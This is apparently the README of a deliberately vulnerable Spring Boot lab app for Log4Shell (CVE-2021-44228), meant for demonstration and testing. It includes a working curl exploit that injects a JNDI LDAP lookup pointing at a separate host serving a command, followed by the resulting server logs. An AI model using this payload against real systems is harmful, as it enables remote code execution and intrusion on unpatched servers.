# Log4Shell vulnerable application (CVE-2021-44228)

This repository contains a Spring Boot web application vulnerable to CVE-2021-44228, known as [Log4Shell](https://www.lunasec.io/docs/blog/log4j-zero-day/).

It uses 
* `log-4j-core:2.14.1` (through `spring-boot-starter-log4j2`) and
* `openjdk:8u181`

## Running the application

Run it:

```bash
docker run --name vulnerable-app --rm -p 8080:8080 romanutti/log4shell-vulnerable-app
```

Or alternatively, build it yourself:

```bash
docker build . -t vulnerable-app
docker run -p 8080:8080 --name vulnerable-app --rm vulnerable-app
```

## Exploitation steps

*Note: This is highly inspired from the original [LunaSec advisory](https://www.lunasec.io/docs/blog/log4j-zero-day/). **Run at your own risk, preferably in a VM in a sandbox environment**.*

* Trigger the exploit using:

```bash
# will execute 'touch /tmp/pwned'
curl 127.0.0.1:8080 -H 'user: ${jndi:ldap://192.168.1.4:1389/Basic/Command/Base64/dG91Y2ggL3RtcC9wd25lZAo=}'
```

* Notice the warning in the server logs, that indicates that a JNDI lookup was tried:

```
2021-12-31 21:28:40.508  INFO 1 --- [           main] c.r.l.v.VulnerableApplication            : Started VulnerableApplication in 3.581 seconds (JVM running for 5.01)
2021-12-31 21:39:21.180  INFO 1 --- [nio-8080-exec-1] o.a.c.c.C.[.[.[/]                        : Initializing Spring DispatcherServlet 'dispatcherServlet'
2021-12-31 21:39:21.180  INFO 1 --- [nio-8080-exec-1] o.s.w.s.DispatcherServlet                : Initializing Servlet 'dispatcherServlet'
2021-12-31 21:39:21.181  INFO 1 --- [nio-8080-exec-1] o.s.w.s.DispatcherServlet                : Completed initialization in 1 ms
2021-12-31 21:39:22,308 http-nio-8080-exec-1 WARN Error looking up JNDI resource [ldap://192.168.1.4:1389/Basic/Command/Base64/dG91Y2ggL3RtcC9wd25lZAo=]. javax.naming.CommunicationException: 192.168.1.4:1389 [Root exception is java.net.ConnectException: Connection refused (Connection refused)]
        at com.sun.jndi.ldap.Connection.<init>(Connection.java:238)
        at com.sun.jndi.ldap.LdapClient.<init>(LdapClient.java:137)
```

## Reference

https://www.lunasec.io/docs/blog/log4j-zero-day/
https://mbechler.github.io/2021/12/10/PSA_Log4Shell_JNDI_Injection/

